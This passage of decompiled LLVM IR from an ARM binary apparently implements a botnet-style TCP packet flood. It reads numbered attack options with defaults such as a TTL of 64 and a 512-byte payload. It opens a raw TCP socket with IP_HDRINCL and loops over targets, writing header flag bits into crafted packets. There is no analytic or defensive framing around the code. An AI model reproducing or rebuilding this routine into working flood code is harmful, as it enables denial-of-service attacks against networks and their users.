  %v3_b9f4 = load i8, i8* %v2_b9f4, align 1
  %v4_b9f4 = zext i8 %v3_b9f4 to i32
  store i32 %v1_b9f8, i32* %r3.global-to-local, align 4
  %v1_b9fc = and i32 %v4_b9f4, 251
  %v5_ba00 = or i32 %v1_b9fc, %v4_ba00
  store i32 %v5_ba00, i32* %r2.global-to-local, align 4
  %v1_ba04 = trunc i32 %v5_ba00 to i8
  store i8 %v1_ba04, i8* %v2_b9f4, align 1
  store i32 %v1_b58c, i32* %r1.global-to-local, align 4
  %v0_ba0c = load i32, i32* @sl, align 4
  %v1_ba0c = add i32 %v0_ba0c, 13
  %v2_ba0c = inttoptr i32 %v1_ba0c to i8*
  %v3_ba0c = load i8, i8* %v2_ba0c, align 1
  %v4_ba0c = zext i8 %v3_ba0c to i32
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  %v1_ba14 = and i32 %v4_ba0c, 253
  %v4_ba18 = or i32 %v1_ba14, %v3_ba18
  store i32 %v4_ba18, i32* %r3.global-to-local, align 4
  %v1_ba1c = trunc i32 %v4_ba18 to i8
  store i8 %v1_ba1c, i8* %v2_ba0c, align 1
  %v0_ba24 = load i32, i32* @sl, align 4
  %v1_ba24 = add i32 %v0_ba24, 13
  %v2_ba24 = inttoptr i32 %v1_ba24 to i8*
  %v3_ba24 = load i8, i8* %v2_ba24, align 1
  %v4_ba24 = zext i8 %v3_ba24 to i32
  %v1_ba2c = and i32 %v4_ba24, 254
  store i32 %v1_ba2c, i32* %r2.global-to-local, align 4
  %v2_ba30 = or i32 %v1_ba2c, %v1_ba28
  store i32 %v2_ba30, i32* %r3.global-to-local, align 4
  %v1_ba34 = trunc i32 %v2_ba30 to i8
  store i8 %v1_ba34, i8* %v2_ba24, align 1
  %v3_ba38 = load i32, i32* @sl, align 4
  %v4_ba38 = add i32 %v3_ba38, 14
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v1_b9a4, i16* %v5_ba38, align 2
  store i32 %v6_b5c4, i32* %r1.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r4, align 4
  %v1_ba40 = add i32 %v0_ba40, 40
  store i32 %v1_ba40, i32* %r0.global-to-local, align 4
  %v2_ba44 = inttoptr i32 %v1_ba40 to i16*
  %v3_ba44 = call i32 @function_f770(i16* %v2_ba44, i32 %v6_b5c4)
  store i32 %v3_ba44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7c4

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_b630
  store i32 %v6_b5c4, i32* %r2.global-to-local, align 4
  %.pre = add i32 %v6_b5c4, 40
  br label %dec_label_pc_ba5c

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_b7d8, %dec_label_pc_ba4c
  %storemerge7.pre-phi = phi i32 [ %v1_b8a4, %dec_label_pc_b7d8 ], [ %.pre, %dec_label_pc_ba4c ]
  %v0_ba6823 = phi i32 [ %v0_b7cc, %dec_label_pc_b7d8 ], [ 0, %dec_label_pc_ba4c ]
  store i32 %storemerge7.pre-phi, i32* @r7, align 4
  %storemerge5 = mul i32 %v6_b5c4, 65536
  %storemerge = add i32 %v6_b5c4, 20
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v1_ba5c = add i32 %storemerge5, 1310720
  store i32 %v1_ba5c, i32* %r3.global-to-local, align 4
  %v3_ba60 = udiv i32 %v1_ba5c, 65536
  store i32 %v3_ba60, i32* @sl, align 4
  %v2_bb98 = icmp eq i32 %v1_b5e4, 0
  %v3_ba8c = icmp eq i32 %v3_b638, 65535
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_bb7c, %dec_label_pc_ba5c
  %v0_ba68 = phi i32 [ %v0_ba6823, %dec_label_pc_ba5c ], [ 0, %dec_label_pc_bb7c ], [ 0, %dec_label_pc_ba64 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ba68 = icmp eq i32 %v0_ba68, 0
  store i1 %v2_ba68, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba68, label %dec_label_pc_ba64, label %dec_label_pc_ba74

dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_bb7c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ba78

dec_label_pc_ba78:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_ba74
  %v1_ba84 = phi i32 [ %v1_bb6c, %dec_label_pc_baa4 ], [ 0, %dec_label_pc_ba74 ]
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b638, i32* %r1.global-to-local, align 4
  %v4_ba84 = mul i32 %v1_ba84, 4
  %v5_ba84 = add i32 %v4_ba84, %v2_b44c
  %v6_ba84 = inttoptr i32 %v5_ba84 to i32*
  %v7_ba84 = load i32, i32* %v6_ba84, align 4
  store i32 %v7_ba84, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_ba8c, i1* %cpsr_z.global-to-local, align 1
  %v1_ba90 = add i32 %v7_ba84, 20
  store i32 %v1_ba90, i32* @r5, align 4
  br i1 %v3_ba8c, label %dec_label_pc_bb90, label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba78
  store i32 %v1_b5e4, i32* %r2.global-to-local, align 4
  store i1 %v2_bb98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb98, label %dec_label_pc_baa4, label %dec_label_pc_bba4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba98, %dec_label_pc_bb90, %dec_label_pc_bba4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baa8 = load i32, i32* @r4, align 4
  %v3_baa8 = add i32 %v2_baa8, 10
  %v4_baa8 = inttoptr i32 %v3_baa8 to i16*
  store i16 0, i16* %v4_baa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bab0 = load i32, i32* @r4, align 4
  store i32 %v0_bab0, i32* @r0, align 4
  %v2_bab4 = call i32 @function_dadc(i32 %v0_bab0, i32 20)
  %v3_bab4 = trunc i32 %v2_bab4 to i16
  store i32 %v2_bab4, i32* %r0.global-to-local, align 4
  %v3_bab8 = load i32, i32* %stack_var_-44, align 4
  %v3_babc = mul i32 %v3_bab8, 16
  %v1_bac0 = load i32, i32* @r8, align 4
  %v2_bac0 = add i32 %v1_bac0, %v3_babc
  store i32 %v2_bac0, i32* %r2.global-to-local, align 4
  %v1_bac4 = add i32 %v2_bac0, 4
  %v2_bac4 = inttoptr i32 %v1_bac4 to i32*
  %v3_bac4 = load i32, i32* %v2_bac4, align 4
  %v3_bac8 = mul i32 %v3_bac4, 65536
  store i32 %v3_bac8, i32* %r1.global-to-local, align 4
  %v1_bacc = add i32 %v3_bac4, 1
  store i32 %v1_bacc, i32* %r3.global-to-local, align 4
  store i32 %v1_bacc, i32* %v2_bac4, align 4
  %v3_bad4 = load i32, i32* @r4, align 4
  %v4_bad4 = add i32 %v3_bad4, 10
  %v5_bad4 = inttoptr i32 %v4_bad4 to i16*
  store i16 %v3_bab4, i16* %v5_bad4, align 2
  %v0_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bad8 = udiv i32 %v0_bad8, 65536
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  %v1_badc = call i32 @function_1484c(i32 %v3_bad8)
  store i32 %v1_badc, i32* %r0.global-to-local, align 4
  %v1_bae0 = load i32, i32* @r5, align 4
  %v2_bae0 = add i32 %v1_bae0, 4
  %v3_bae0 = inttoptr i32 %v2_bae0 to i32*
  store i32 %v1_badc, i32* %v3_bae0, align 4
  %v3_bae4 = load i32, i32* %stack_var_-44, align 4
  %v3_bae8 = mul i32 %v3_bae4, 16
  %v1_baec = load i32, i32* @r8, align 4
  %v2_baec = add i32 %v1_baec, %v3_bae8
  store i32 %v2_baec, i32* %r3.global-to-local, align 4
  %v1_baf0 = add i32 %v2_baec, 8
  %v2_baf0 = inttoptr i32 %v1_baf0 to i32*
  %v3_baf0 = load i32, i32* %v2_baf0, align 4
  %v3_baf8 = urem i32 %v3_baf0, 65536
  store i32 %v3_baf8, i32* %r0.global-to-local, align 4
  %v1_bafc = call i32 @function_1484c(i32 %v3_baf8)
  %v2_bb04 = load i32, i32* @r5, align 4
  %v3_bb04 = add i32 %v2_bb04, 16
  %v4_bb04 = inttoptr i32 %v3_bb04 to i16*
  store i16 0, i16* %v4_bb04, align 2
  %v1_bb08 = load i32, i32* @r5, align 4
  %v2_bb08 = add i32 %v1_bb08, 8
  %v3_bb08 = inttoptr i32 %v2_bb08 to i32*
  store i32 %v1_bafc, i32* %v3_bb08, align 4
  %v0_bb0c = load i32, i32* @sl, align 4
  store i32 %v0_bb0c, i32* %r0.global-to-local, align 4
  %v1_bb10 = call i32 @function_1484c(i32 %v0_bb0c)
  %v0_bb14 = load i32, i32* @r5, align 4
  store i32 %v0_bb14, i32* @r1, align 4
  store i32 %v1_bb10, i32* %r2.global-to-local, align 4
  %v0_bb1c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_bb1c, i32* %r3.global-to-local, align 4
  %v0_bb20 = load i32, i32* @r4, align 4
  store i32 %v0_bb20, i32* %r0.global-to-local, align 4
  %v4_bb24 = call i32 @function_db2c(i32 %v0_bb20, i32 %v0_bb14, i32 %v1_bb10, i32 %v0_bb1c)
  %v5_bb24 = trunc i32 %v4_bb24 to i16
  store i32 %v4_bb24, i32* %r0.global-to-local, align 4
  %v3_bb28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bb28, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v3_bb30 = mul i32 %v3_bb28, 32
  store i32 %v3_bb30, i32* %lr.global-to-local, align 4
  %v3_bb34 = load i32, i32* @r5, align 4
  %v4_bb34 = add i32 %v3_bb34, 16
  %v5_bb34 = inttoptr i32 %v4_bb34 to i16*
  store i16 %v5_bb24, i16* %v5_bb34, align 2
  %v0_bb38 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb38 = load i32, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_bb38, -8
  %v5_bb38 = add i32 %v0_bb38, %tmp95
  store i32 %v5_bb38, i32* %lr.global-to-local, align 4
  %v0_bb3c = load i32, i32* @r5, align 4
  %v1_bb3c = add i32 %v0_bb3c, 2
  %v2_bb3c = inttoptr i32 %v1_bb3c to i16*
  %v3_bb3c = load i16, i16* %v2_bb3c, align 2
  %v4_bb3c = zext i16 %v3_bb3c to i32
  store i32 %v4_bb3c, i32* %r5.global-to-local, align 4
  %v1_bb40 = load i32, i32* %r1.global-to-local, align 4
  %v2_bb40 = add i32 %v1_bb40, %v5_bb38
  store i32 %v2_bb40, i32* @lr, align 4
  %v3_bb44 = add i32 %v2_bb40, 2
  %v4_bb44 = inttoptr i32 %v3_bb44 to i16*
  store i16 %v3_bb3c, i16* %v4_bb44, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* @r1, align 4
  %v0_bb54 = load i32, i32* @fp, align 4
  store i32 %v0_bb54, i32* @r0, align 4
  %v0_bb58 = load i32, i32* @r7, align 4
  store i32 %v0_bb58, i32* @r2, align 4
  %v0_bb64 = call i32 @function_14a98()
  %v3_bb68 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bb68, i32* %r3.global-to-local, align 4
  %v1_bb6c = add i32 %v3_bb68, 1
  store i32 %v1_bb6c, i32* %r0.global-to-local, align 4
  %v0_bb70 = load i32, i32* @r6, align 4
  %v9_bb70 = icmp eq i32 %v0_bb70, %v1_bb6c
  store i1 %v9_bb70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bb6c, i32* %stack_var_-44, align 4
  %v8_bb78 = icmp sgt i32 %v0_bb70, %v1_bb6c
  br i1 %v8_bb78, label %dec_label_pc_ba78, label %dec_label_pc_bb7c

dec_label_pc_bb7c:                                ; preds = %dec_label_pc_baa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bb80 = icmp eq i32 %v0_bb70, 0
  store i1 %v2_bb80, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bb80, label %dec_label_pc_ba64, label %dec_label_pc_ba74

dec_label_pc_bb90:                                ; preds = %dec_label_pc_ba78
  %v0_bb90 = call i32 @function_f570()
  %v1_bb90 = trunc i32 %v0_bb90 to i16
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  store i32 %v1_b5e4, i32* %r2.global-to-local, align 4
  store i1 %v2_bb98, i1* %cpsr_z.global-to-local, align 1
  %v3_bb9c = load i32, i32* @r4, align 4
  %v4_bb9c = add i32 %v3_bb9c, 4
  %v5_bb9c = inttoptr i32 %v4_bb9c to i16*
  store i16 %v1_bb90, i16* %v5_bb9c, align 2
  br i1 %v2_bb98, label %dec_label_pc_baa4, label %dec_label_pc_bb90.dec_label_pc_bba4_crit_edge

dec_label_pc_bb90.dec_label_pc_bba4_crit_edge:    ; preds = %dec_label_pc_bb90
  %v0_bba4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bba4

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb90.dec_label_pc_bba4_crit_edge, %dec_label_pc_ba98
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bb90.dec_label_pc_bba4_crit_edge ], [ %v7_ba84, %dec_label_pc_ba98 ]
  %v1_bba4 = add i32 %v0_bba4, 40
  store i32 %v1_bba4, i32* %r0.global-to-local, align 4
  store i32 %v6_b5c4, i32* %r1.global-to-local, align 4
  %v2_bbac = inttoptr i32 %v1_bba4 to i16*
  %v3_bbac = call i32 @function_f770(i16* %v2_bbac, i32 %v6_b5c4)
  store i32 %v3_bbac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_baa4

; uselistorder directives
  uselistorder i32 %v0_bb90, { 1, 0 }
  uselistorder i32 %v1_bb6c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bb38, { 1, 0 }
  uselistorder i32 %v4_bb24, { 1, 0 }
  uselistorder i32 %v3_baf8, { 1, 0 }
  uselistorder i32 %v3_bad8, { 1, 0 }
  uselistorder i32 %v3_bac4, { 1, 0 }
  uselistorder i32 %v2_bab4, { 1, 0 }
  uselistorder i1 %v3_ba8c, { 1, 0 }
  uselistorder i1 %v2_bb98, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b9a4, { 1, 0 }
  uselistorder i32 %v1_b92c, { 1, 0 }
  uselistorder i32 %v1_b908, { 1, 0 }
  uselistorder i32 %v3_b8f8, { 1, 0 }
  uselistorder i32 %v0_b848, { 1, 0 }
  uselistorder i32 %v1_b82c, { 1, 2, 0 }
  uselistorder i32 %v1_b7c8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b7b4, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b740, { 1, 0 }
  uselistorder i32 %v0_b738, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b768, { 1, 0 }
  uselistorder i32 %v4_b77c, { 1, 0 }
  uselistorder i32 %v0_b85c, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v1_b6d4, { 1, 0 }
  uselistorder i32 %v4_b6b4, { 1, 0 }
  uselistorder i1 %v7_b6ac, { 1, 0, 2 }
  uselistorder i1 %v7_b660, { 1, 0 }
  uselistorder i32 %v3_b65c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i32 %v1_ba10, { 1, 0 }
  uselistorder i32 %v1_b9f8, { 1, 0 }
  uselistorder i32 %v1_b9e0, { 1, 0 }
  uselistorder i32 %v1_b9c8, { 1, 0 }
  uselistorder i32 %v1_b9b0, { 1, 0 }
  uselistorder i32 %v3_b774, { 0, 2, 1 }
  uselistorder i1 %v2_b790, { 1, 0 }
  uselistorder i32 %v1_b78c, { 1, 0 }
  uselistorder i32 %v4_b788, { 2, 0, 1 }
  uselistorder i1 %v3_b83c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b694, { 1, 0, 2 }
  uselistorder i32 %v3_b638, { 3, 4, 2, 1, 0 }
  uselistorder i1 %v7_b628, { 1, 0 }
  uselistorder i1 %v7_b5fc, { 1, 0 }
  uselistorder i32 %v3_b5f8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b5e4, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b5c4, { 8, 7, 2, 0, 1, 9, 5, 4, 6, 3 }
  uselistorder i32 %v3_b4ec, { 1, 3, 2, 0, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 46, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 45, 44, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 19, 18, 20, 21, 22, 23, 25, 24, 27, 26, 28, 30, 29, 31, 33, 32, 34, 35, 36, 38, 37, 39, 41, 40, 43, 42, 45, 44, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 24, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 2, 1, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_baa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ba74, { 1, 0 }
  uselistorder label %dec_label_pc_ba64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba5c, { 1, 0 }
  uselistorder label %dec_label_pc_b934, { 1, 0 }
  uselistorder label %dec_label_pc_b7f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b7c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b700, { 2, 1, 3, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_b66c, { 1, 0 }
}

define i32 @function_bbb8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bbb8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_bbb8 = load i32, i32* @r4, align 4
  %v18_bbb8 = load i32, i32* @sb, align 4
  %v24_bbb8 = load i32, i32* @fp, align 4
  %v27_bbb8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bbd4 = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_bbd8 = load i32, i32* @r5, align 4
  store i32 %v0_bbd8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  %v5_bbec = inttoptr i32 %v0_bbd8 to i32*
  %v6_bbec = call i32 @function_a430(i32 %v0_bbe8, i32* %v5_bbec, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bc04 = load i32, i32* @r5, align 4
  store i32 %v0_bc04, i32* %r1.global-to-local, align 4
  %v0_bc08 = load i32, i32* @r4, align 4
  %v5_bc0c = trunc i32 %v6_bbec to i8
  %v6_bc10 = inttoptr i32 %v0_bc04 to i32*
  %v7_bc10 = call i32 @function_a430(i32 %v0_bc08, i32* %v6_bc10, i32 3, i32 65535)
  %v0_bc14 = load i32, i32* @r5, align 4
  store i32 %v0_bc14, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_bc24 = load i32, i32* @r4, align 4
  %v5_bc28 = inttoptr i32 %v0_bc14 to i32*
  %v6_bc28 = call i32 @function_a430(i32 %v0_bc24, i32* %v5_bc28, i32 4, i32 64)
  %v0_bc34 = load i32, i32* @r5, align 4
  store i32 %v0_bc34, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc40 = load i32, i32* @r4, align 4
  %v6_bc48 = inttoptr i32 %v0_bc34 to i32*
  %v7_bc48 = call i32 @function_a430(i32 %v0_bc40, i32* %v6_bc48, i32 5, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc5c = load i32, i32* @r5, align 4
  store i32 %v0_bc5c, i32* %r1.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  %v1_bc64 = urem i32 %v7_bc48, 256
  store i32 %v1_bc64, i32* @fp, align 4
  %v4_bc68 = inttoptr i32 %v0_bc5c to i32*
  %v5_bc68 = call i32 @function_a430(i32 %v0_bc60, i32* %v4_bc68, i32 6, i32 65535)
  %v0_bc70 = load i32, i32* @r5, align 4
  store i32 %v0_bc70, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v5_bc68, i32* @sl, align 4
  %v0_bc80 = load i32, i32* @r4, align 4
  %v4_bc84 = inttoptr i32 %v0_bc70 to i32*
  %v5_bc84 = call i32 @function_a430(i32 %v0_bc80, i32* %v4_bc84, i32 7, i32 65535)
  %v0_bc8c = load i32, i32* @r5, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bc84, i32* @r6, align 4
  %v0_bc9c = load i32, i32* @r4, align 4
  %v4_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v5_bca0 = call i32 @function_a430(i32 %v0_bc9c, i32* %v4_bca0, i32 17, i32 65535)
  %v0_bcac = load i32, i32* @r5, align 4
  store i32 %v0_bcac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bcb8 = load i32, i32* @r4, align 4
  %v5_bcbc = inttoptr i32 %v0_bcac to i32*
  %v6_bcbc = call i32 @function_a430(i32 %v0_bcb8, i32* %v5_bcbc, i32 18, i32 65535)
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bcd0 = load i32, i32* @r4, align 4
  %v5_bcd4 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd4 = call i32 @function_a430(i32 %v0_bcd0, i32* %v5_bcd4, i32 11, i32 0)
  %v0_bcd8 = load i32, i32* @r5, align 4
  store i32 %v0_bcd8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bce8 = load i32, i32* @r4, align 4
  %v5_bcec = inttoptr i32 %v0_bcd8 to i32*
  %v6_bcec = call i32 @function_a430(i32 %v0_bce8, i32* %v5_bcec, i32 12, i32 1)
  %v0_bcf0 = load i32, i32* @r5, align 4
  store i32 %v0_bcf0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd00 = load i32, i32* @r4, align 4
  %v5_bd04 = inttoptr i32 %v0_bcf0 to i32*
  %v6_bd04 = call i32 @function_a430(i32 %v0_bd00, i32* %v5_bd04, i32 13, i32 0)
  %v0_bd08 = load i32, i32* @r5, align 4
  store i32 %v0_bd08, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd18 = load i32, i32* @r4, align 4
  %v5_bd1c = inttoptr i32 %v0_bd08 to i32*
  %v6_bd1c = call i32 @function_a430(i32 %v0_bd18, i32* %v5_bd1c, i32 14, i32 0)
  %v0_bd20 = load i32, i32* @r5, align 4
  store i32 %v0_bd20, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd30 = load i32, i32* @r4, align 4
  %v5_bd34 = inttoptr i32 %v0_bd20 to i32*
  %v6_bd34 = call i32 @function_a430(i32 %v0_bd30, i32* %v5_bd34, i32 15, i32 0)
  %v0_bd38 = load i32, i32* @r5, align 4
  store i32 %v0_bd38, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd48 = load i32, i32* @r4, align 4
  %v5_bd4c = inttoptr i32 %v0_bd38 to i32*
  %v6_bd4c = call i32 @function_a430(i32 %v0_bd48, i32* %v5_bd4c, i32 16, i32 0)
  %v0_bd50 = load i32, i32* @r5, align 4
  store i32 %v0_bd50, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_bd4c, i32* @sb, align 4
  %v0_bd60 = load i32, i32* @r4, align 4
  %v4_bd64 = inttoptr i32 %v0_bd50 to i32*
  %v5_bd64 = call i32 @function_a430(i32 %v0_bd60, i32* %v4_bd64, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd74 = load i32, i32* @r5, align 4
  store i32 %v0_bd74, i32* %r1.global-to-local, align 4
  %v0_bd78 = load i32, i32* @r4, align 4
  %v4_bd7c = inttoptr i32 %v0_bd74 to i32*
  %v5_bd7c = call i32 @function_a430(i32 %v0_bd78, i32* %v4_bd7c, i32 1, i32 1)
  %v2_bd88 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_bd88, i32* %r3.global-to-local, align 4
  %v1_bd8c = urem i32 %v5_bd7c, 256
  %v0_bd90 = load i32, i32* @r5, align 4
  store i32 %v0_bd90, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bd98 = load i32, i32* @r4, align 4
  %v5_bda0 = inttoptr i32 %v0_bd90 to i32*
  %v6_bda0 = call i32 @function_a3c4(i32 %v0_bd98, i32* %v5_bda0, i32 25, i32 %v2_bd88, i32 %v1_bd8c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bdb4 = call i32 @function_14b54(i32 2, i32 3, i32 6)
  store i32 %v3_bdb4, i32* @r0, align 4
  %v7_bdb8 = icmp eq i32 %v3_bdb4, -1
  store i1 %v7_bdb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bdb8, label %dec_label_pc_c02c, label %dec_label_pc_bdc4

dec_label_pc_bdc4:                                ; preds = %dec_label_pc_bbb8
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bdcc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bdcc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_bde0 = call i32 @function_14ae4(i32 %v3_bdb4, i32 0, i32 3, i32 %v6_bdcc, i32 4)
  %v7_bde4 = icmp eq i32 %v5_bde0, -1
  store i1 %v7_bde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bde4, label %dec_label_pc_c024, label %dec_label_pc_bdec

dec_label_pc_bdec:                                ; preds = %dec_label_pc_bdc4
  %v0_bdf0 = load i32, i32* @sl, align 4
  %v0_bdf8 = load i32, i32* @r6, align 4
  %v3_be00 = urem i32 %v7_bc10, 65536
  store i32 %v3_be00, i32* %r3.global-to-local, align 4
  %v3_be04 = urem i32 %v0_bdf0, 65536
  store i32 %v3_be04, i32* %r2.global-to-local, align 4
  %v3_be08 = urem i32 %v0_bdf8, 65536
  store i32 %v3_be08, i32* %r1.global-to-local, align 4
  %v0_be0c = load i32, i32* @r7, align 4
